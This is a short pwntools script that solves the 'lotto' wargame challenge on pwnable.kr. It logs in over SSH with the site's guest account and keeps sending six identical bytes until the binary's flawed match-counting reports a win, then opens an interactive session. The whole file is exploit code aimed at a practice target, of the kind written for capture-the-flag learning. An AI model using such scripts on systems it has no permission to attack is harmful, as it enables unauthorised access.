from pwn import *

p = ssh("lotto", "pwnable.kr", 2222, "guest").process("/home/lotto/lotto")

sla = p.sendlineafter
sa = p.sendafter

while True:
    payload = b"\x01" * 6  # choose 6 same numbers
    sla(b"3. Exit\n", b"1")
    sa(b"Submit your 6 lotto bytes : ", payload)

    p.recvuntil(b"Lotto Start!\n")
    result = p.recvline()
    if b"bad luck..." in result:
        continue
    else:
        print(result)
        break

p.interactive()
